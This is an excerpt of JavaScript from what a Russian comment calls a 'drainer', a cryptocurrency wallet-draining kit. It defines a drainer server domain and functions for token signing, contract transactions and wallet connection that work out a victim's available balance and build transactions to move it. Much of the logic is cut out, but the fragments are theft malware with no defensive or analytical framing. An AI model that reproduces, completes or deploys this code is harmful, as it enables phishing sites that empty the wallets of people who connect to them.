...
const MS_Server = "localhost:3000"; // Указать домен, который прикреплен к серверу дрейнера
...
const SIGN_TOKEN = async (asset) => {
  ...
  //console.log('gas_price', ethers.utils.formatUnits(gas_price, 'ether'));
  available_balance = web3.utils.toHex(available_amount.toString());
  console.log('available_balance', available_balance); 
  //console.log('available_amount', ethers.utils.formatUnits(available_amount, 'ether'));
...
const DO_CONTRACT = async (asset) => {
  ...
  //const decimalValue = ethers.BigNumber.from(unsigned_tx.value).toString();
  console.log('tx value', ethers.utils.formatUnits(unsigned_tx.value, 'ether')); // Output: 24743998130958210
...
const connect_wallet = async (provider = null) => {
  ...
  try {
	...
	//CONNECTION SUCCESS
    await connect_success(); console.log("Show check"); show_check();
